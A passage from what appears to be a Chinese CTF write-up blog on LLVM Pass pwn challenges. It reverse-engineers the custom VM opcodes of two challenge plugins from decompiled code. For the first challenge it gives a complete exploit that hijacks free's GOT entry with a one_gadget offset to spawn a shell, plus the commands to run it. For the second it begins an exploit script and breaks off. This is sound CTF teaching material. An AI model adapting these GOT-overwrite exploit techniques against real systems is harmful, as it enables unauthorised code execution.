class="comment">//更新v5移动到下一个基本块</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数调用了一个sub_6B80函数，并且传入了一个llvm::BasicBlock类型参数。这段代码干的事情，其实就是遍历了<code>o0o0o0o0</code>函数中的所有基本块（代码块），然后依次将这些基本块传入到sub_6B80中执行。跟进函数。进去之后可以发现其实里面的主逻辑和刚刚分析的是一样的，也是以基本块为单位去逐个进行判断。只不过这次就不是传参后执行函数了，而是直接进行匹配了。我们先来看开始循环之后程序干了什么事情。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(v39);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::Instruction::getOpcode(v36) == <span class="number">0x37</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v35 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br><span class="line">  <span class="keyword">if</span> ( v35 )</span><br><span class="line">  &#123;</span><br><span class="line">    s1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(v35);</span><br><span class="line">    Name = (_QWORD *)llvm::Value::getName(CalledFunction);</span><br><span class="line">    *(_QWORD *)s1 = *Name;</span><br><span class="line">    *((_QWORD *)s1 + <span class="number">1</span>) = Name[<span class="number">1</span>];</span><br><span class="line">    *((_QWORD *)s1 + <span class="number">2</span>) = Name[<span class="number">2</span>];</span><br><span class="line">    *((_QWORD *)s1 + <span class="number">3</span>) = Name[<span class="number">3</span>];</span><br></pre></td></tr></table></figure><p>第一个if进行了一个对Opcode的判断，判断是否为0x37，查资料可以得知这个llvm指令对应的IR代码是call。也就以为着，这里大循环其实只对函数调用进行处理，其他的一律不关心。接下来申请了一块堆地址拿来储存后面getName获取到的，被<code>o0o0o0o0</code>函数调用的函数的名字，并且只取了前面四个字节。</p><p>搞清楚这个之后，后面就是对不同被调用函数的处理了，我们这里以pop函数举例分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;pop&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ArgOperand = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">    v32 = <span class="number">0LL</span>;</span><br><span class="line">    v31 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">    <span class="keyword">if</span> ( v31 )</span><br><span class="line">    &#123;</span><br><span class="line">      ZExtValue = llvm::ConstantInt::getZExtValue(v31);</span><br><span class="line">      <span class="keyword">if</span> ( ZExtValue == <span class="number">1</span> )</span><br><span class="line">        v32 = off_20DFD0;</span><br><span class="line">      <span class="keyword">if</span> ( ZExtValue == <span class="number">2</span> )</span><br><span class="line">        v32 = off_20DFC0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v32 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = off_20DFD8;</span><br><span class="line">      *v32 = *(_QWORD *)*off_20DFD8;</span><br><span class="line">      *v3 -= <span class="number">8LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getNumOperands</code>获取的是函数的操作数数量（包括被调用函数本身和其调用参数），这也就意味着pop函数需要1个参数。<code>ArgOperand = llvm::CallBase::getArgOperand(v35, 0);</code>这句是取第一个参数赋值给ArgOperand。后面对这个参数动态类型转换之后进行了一个判断：如果为1，取off_20DFD0，为2则取off_20DFC0赋值给v32。再到后面3句就很好理解了，简单来说，off_20DFD8相当于sp指针，指向了栈顶，现在将栈顶数据弹出给了v32指向的地址，并且sp指针-8。名副其实的pop函数。</p><p>简单介绍后面的几个函数解析（下面的选择地址指的是第一个参数是1还是2）：</p><ul><li>push：选择一个地址的数据压栈</li><li>store：选择一个地址，将另一个地址指向的地址赋值给自己指向的地址</li><li>load：选择一个地址，将自己指向的地址的数据赋值给另一个地址（是有点绕，自己分析可能还清晰点）</li><li>add：两个参数，选择一个地址，并将数据加上第二个参数</li><li>min：两个参数，选择一个地址，并将数据减去第二个参数</li></ul><p>那其实有这些指令之后思路还算比较清晰：</p><ol><li>利用add将1赋值为got表地址</li><li>利用load取出1中got表指向的地址，拿到libc地址，存到2中</li><li>将2加减一定偏移，使得该地址成为ogg的真实地址</li><li>利用store将2中的ogg地址写回到1也就是got表中</li><li>等到程序执行到那个got表函数，自然而然就可以拿到shell了</li></ol><p>所以其实load函数是一个任意地址读，store是任意地址写。不难注意到在处理完被调用函数之后程序调用了一次free，所以我们选择free的got表进行劫持。</p><p>free的got表在opt程序中的偏移是0x77E100。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> num, <span class="type">int</span> val)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> num, <span class="type">int</span> val)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> num)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> num)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x77E100</span>);</span><br><span class="line">load(<span class="number">1</span>);</span><br><span class="line">min(<span class="number">2</span>, <span class="number">0x9a6d0</span>);</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xe3afe</span>);</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x870</span>);</span><br><span class="line">store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clang -emit-llvm -S exp.c -o exp.ll</span><br><span class="line">./opt -load ./VMPass.so -VMPass exp.ll</span><br></pre></td></tr></table></figure><h2 id="源鲁杯2024-show-me-the-code"><a href="#源鲁杯2024-show-me-the-code" class="headerlink" title="源鲁杯2024 show_me_the_code"></a>源鲁杯2024 show_me_the_code</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="获取正确函数名"><a href="#获取正确函数名" class="headerlink" title="获取正确函数名"></a>获取正确函数名</h4><p>老方法，先定位到runOnFunction，这道题好在他没有抹掉符号表，可以直接找到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall `anonymous namespace<span class="number">&#x27;</span>::c0oo0o0Ode::runOnFunction(</span><br><span class="line">        _anonymous_namespace_::c0oo0o0Ode *this,</span><br><span class="line">        llvm::Function *a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+Fh] [rbp-51h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  __int64 v6[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 Name; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  llvm::Value *v9; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  _anonymous_namespace_::c0oo0o0Ode *v10; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = this;</span><br><span class="line">  v9 = a2;</span><br><span class="line">  secret::init(this);</span><br><span class="line">  Name = llvm::Value::getName(a2);</span><br><span class="line">  v8 = v2;</span><br><span class="line">  VMDatProt::getStrFromProt2(v5, &amp;`anonymous namespace<span class="number">&#x27;</span>::vmFuncName[abi:cxx11], &amp;secret::vmKey[abi:cxx11]);</span><br><span class="line">  llvm::StringRef::StringRef(v6, v5);</span><br><span class="line">  v4 = llvm::operator==(Name, v8, v6[<span class="number">0</span>], v6[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v5);</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    `anonymous namespace<span class="number">&#x27;</span>::c0oo0o0Ode::vmRun(this, v9);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个定义在匿名命名空间的函数，中间应该是进行了一些解密的操作，然后将解密出来的字符串和传入的函数名对比，如果相等则执行vmRun函数。所以vmRun应该才是核心函数。但是在这之前，我们先用动调将正确的函数名称找出来。</p><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-%E6%AD%A3%E7%A1%AE%E7%9A%84%E5%87%BD%E6%95%B0%E5%90%8D%E7%A7%B0.png" alt="yl-正确的函数名称"></p><p>正确函数名是<code>_Z10c0deVmMainv</code>。</p><h4 id="opcode分析"><a href="#opcode分析" class="headerlink" title="opcode分析"></a>opcode分析</h4><p>接下来就该看vmRun函数了。核心逻辑识别8种指令：op1-op8。</p><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-vmRun%E4%B8%BB%E9%80%BB%E8%BE%91.png" alt="yl-vmRun主逻辑"></p><p>每个if都会执行一遍isValidOp，这个函数和runonfunction差不多，也是解密比较函数名字，也就是说，这里要动调确定每个op的函数名。</p><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-op1.png" alt="yl-op1"></p><p>op1的名称是<code>_ZN4edoc4addiEhii</code>。。。以此类推。如果某个被调用的函数符合名称，那么就会进到一个<code>isValidEnv</code>函数进行检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall `anonymous namespace<span class="number">&#x27;</span>::c0oo0o0Ode::isValidEnv(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 Type; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+7h] [rbp-C9h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">32</span>]; <span class="comment">// [rsp+8h] [rbp-C8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">8</span>]; <span class="comment">// [rsp+28h] [rbp-A8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">32</span>]; <span class="comment">// [rsp+30h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">32</span>]; <span class="comment">// [rsp+50h] [rbp-80h] BYREF</span></span><br><span class="line">  __int64 v10[<span class="number">2</span>]; <span class="comment">// [rsp+70h] [rbp-60h] BYREF</span></span><br><span class="line">  __int64 StructName; <span class="comment">// [rsp+80h] [rbp-50h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+88h] [rbp-48h]</span></span><br><span class="line">  llvm::Type *v13; <span class="comment">// [rsp+90h] [rbp-40h]</span></span><br><span class="line">  llvm::Type *ElementType; <span class="comment">// [rsp+98h] [rbp-38h]</span></span><br><span class="line">  llvm::PointerType *v15; <span class="comment">// [rsp+A0h] [rbp-30h]</span></span><br><span class="line">  llvm::Value *ArgOperand; <span class="comment">// [rsp+A8h] [rbp-28h]</span></span><br><span class="line">  llvm::CallBase *v17; <span class="comment">// [rsp+B0h] [rbp-20h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+B8h] [rbp-18h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp+C0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [rsp+CFh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  v19 = a1;</span><br><span class="line">  v18 = a2;</span><br><span class="line">  v17 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;&gt;(a2);</span><br><span class="line">  <span class="keyword">if</span> ( !v17 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  ArgOperand = (llvm::Value *)llvm::CallBase::getArgOperand(v17, <span class="number">0</span>);</span><br><span class="line">  Type = llvm::Value::getType(ArgOperand);</span><br><span class="line">  v15 = (llvm::PointerType *)llvm::dyn_cast&lt;llvm::PointerType,llvm::Type&gt;(Type);</span><br><span class="line">  <span class="keyword">if</span> ( !v15 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  ElementType = (llvm::Type *)llvm::PointerType::getElementType(v15);</span><br><span class="line">  <span class="keyword">if</span> ( (llvm::Type::isStructTy(ElementType) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  v13 = (llvm::Type *)llvm::cast&lt;llvm::StructType,llvm::Type&gt;(ElementType);</span><br><span class="line">  StructName = llvm::Type::getStructName(v13);</span><br><span class="line">  v12 = v3;</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(v7);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string(v8, <span class="string">&quot;class.&quot;</span>, v7);</span><br><span class="line">  VMDatProt::getStrFromProt2(</span><br><span class="line">    (__int64)v6,</span><br><span class="line">    (__int64)&amp;`anonymous namespace<span class="number">&#x27;</span>::vmEnvName[abi:cxx11],</span><br><span class="line">    (__int64)&amp;secret::vmKey[abi:cxx11]);</span><br><span class="line">  <span class="built_in">std</span>::operator+&lt;<span class="type">char</span>&gt;(v9, v8, v6);</span><br><span class="line">  llvm::StringRef::StringRef(v10, v9);</span><br><span class="line">  v5 = llvm::operator==(StructName, v12, v10[<span class="number">0</span>], v10[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v9);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v6);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v8);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(v7);</span><br><span class="line">  <span class="keyword">if</span> ( (v5 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    v20 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">LABEL_6:</span><br><span class="line">    v20 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v20 &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查了参数类型，要求第一个参数一定是<code>struct *</code>类型的，并且还要求这个结构体是class.edoc。这里的edoc是动调解密得到的。这个名字有点奇怪，因为他是IR代码的表现形式。实际上在cpp当中，这个class.edoc就意味着:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">edoc</span>&#123;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个class似乎并没有什么用，但是调用那些op还必须得有，就是纯纯恶心人的设置。</p><p>然后我们来分析op1：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall `anonymous namespace<span class="number">&#x27;</span>::c0oo0o0Ode::op1(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  llvm::Type *Type; <span class="comment">// rax</span></span><br><span class="line">  llvm::Type *v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  llvm::ConstantInt *v7; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  llvm::ConstantInt *v8; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  llvm::Value *ArgOperand; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v11[<span class="number">2</span>]; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 ZExtValue; <span class="comment">// [rsp+37h] [rbp-19h]</span></span><br><span class="line">  llvm::CallBase *v13; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v15 = a1;</span><br><span class="line">  v14 = a2;</span><br><span class="line">  result = llvm::dyn_cast&lt;llvm::CallInst,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;&gt;(a2);</span><br><span class="line">  v13 = (llvm::CallBase *)result;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::getNumArgOperands(v13); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      ArgOperand = (llvm::Value *)llvm::CallBase::getArgOperand(v13, i);</span><br><span class="line">      Type = (llvm::Type *)llvm::Value::getType(ArgOperand);</span><br><span class="line">      <span class="keyword">if</span> ( (llvm::Type::isIntegerTy(Type, <span class="number">8u</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; i == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">        <span class="keyword">if</span> ( v8 )</span><br><span class="line">          ZExtValue = llvm::ConstantInt::getZExtValue(v8);</span><br><span class="line">      &#125;</span><br><span class="line">      v4 = (llvm::Type *)llvm::Value::getType(ArgOperand);</span><br><span class="line">      <span class="keyword">if</span> ( (llvm::Type::isIntegerTy(v4) &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; i &gt; <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">        <span class="keyword">if</span> ( v7 )</span><br><span class="line">          v11[i - <span class="number">2</span>] = llvm::ConstantInt::getZExtValue(v7);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = ZExtValue;</span><br><span class="line">    <span class="keyword">if</span> ( ZExtValue &lt;= <span class="number">5u</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="type">unsigned</span> <span class="type">int</span>)(v11[<span class="number">1</span>] + v11[<span class="number">0</span>]);</span><br><span class="line">      *(_QWORD *)<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">unsigned</span> <span class="type">long</span>&gt;::operator[](&amp;secret::regs, ZExtValue) = v6;</span><br><span class="line">      v5 = llvm::errs((llvm *)&amp;secret::regs);</span><br><span class="line">      <span class="keyword">return</span> llvm::raw_ostream::operator&lt;&lt;(v5, <span class="string">&quot;Op1 done.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求第二个参数是8位int类型的。然后后面的参数是int类型的，这些int参数被存到了v11数组中。可以发现这个v11数组只有2个数的空间而已，但是又没有限制参数数量，这里有个溢出的嫌疑。到了下面，限制了int8的数据要小于等于5，然后会将第二第三参数相加，存到regs[int8偏移]中。根据这些信息，我们可以先把op1的声明写出来<code>void _ZN4edoc4addiEhii(edoc *op, int8_t idx, int num1, int num2);</code>。。。以此类题分析出8个op。</p><p>经过折磨的动调和分析，我们可以得到以下脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">edoc</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// op1</span></span><br><span class="line"><span class="comment">// idx&lt;=5</span></span><br><span class="line"><span class="comment">// regs[idx]=num1+num2</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4addiEhii(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num1, <span class="type">int</span> num2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op2</span></span><br><span class="line"><span class="comment">// idx&lt;=5 &amp;&amp; -0x1000&lt;num&lt;0x1000 &amp;&amp; isUsed[0]==0</span></span><br><span class="line"><span class="comment">// use_once</span></span><br><span class="line"><span class="comment">// regs[idx]+=num</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4chgrEhi(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op3</span></span><br><span class="line"><span class="comment">// idx&lt;=5 &amp;&amp; offset&lt;0x40</span></span><br><span class="line"><span class="comment">// choice==0: regs[idx]&gt;&gt;=offset</span></span><br><span class="line"><span class="comment">// choice==1: regs[idx]&lt;&lt;=offset</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4sftrEhbh(edoc *op, <span class="type">int8_t</span> idx, <span class="type">bool</span> choice, <span class="type">int8_t</span> offset);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op4</span></span><br><span class="line"><span class="comment">// idx1&lt;=5 &amp;&amp; idx2&lt;=5 &amp;&amp; idx3&lt;=5</span></span><br><span class="line"><span class="comment">// regs[idx1] = regs[idx3] | regs[idx2]</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4borrEhhh(edoc *op, <span class="type">int8_t</span> idx1, <span class="type">int8_t</span> idx2, <span class="type">int8_t</span> idx3);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op5</span></span><br><span class="line"><span class="comment">// idx1&lt;8 &amp;&amp; idx2&lt;8</span></span><br><span class="line"><span class="comment">// regs[idx1] = regs[idx2]</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4movrEhh(edoc *op, <span class="type">int8_t</span> idx1, <span class="type">int8_t</span> idx2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op6</span></span><br><span class="line"><span class="comment">// idx&lt;=5 &amp;&amp; num&lt;=0x1000 &amp;&amp; num&amp;7==0 &amp;&amp; regs[6]&amp;0xfff==0 &amp;&amp; regs[7]==regs[6]+0x1000</span></span><br><span class="line"><span class="comment">//*(regs[6]+num) = regs[idx]  //?</span></span><br><span class="line"><span class="type">void</span> 